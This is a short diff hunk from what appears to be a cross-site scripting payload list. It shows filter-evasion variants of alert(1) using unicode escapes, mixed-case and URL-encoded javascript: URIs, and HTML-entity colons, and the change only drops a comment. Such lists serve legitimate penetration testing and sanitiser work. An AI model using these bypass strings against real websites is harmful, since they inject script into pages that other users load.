@@ -1131,7 +1131,7 @@ alert;pg("XSS")
 <img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
 javascript:alert(1)
 JavaSCript:alert(1)
-javascript:%61%6c%65%72%74%28%31%29 //URL encode
+javascript:%61%6c%65%72%74%28%31%29
 javascript&colon;alert(1)
 javascript&#x003A;alert(1)
 javascript&#58;alert(1)
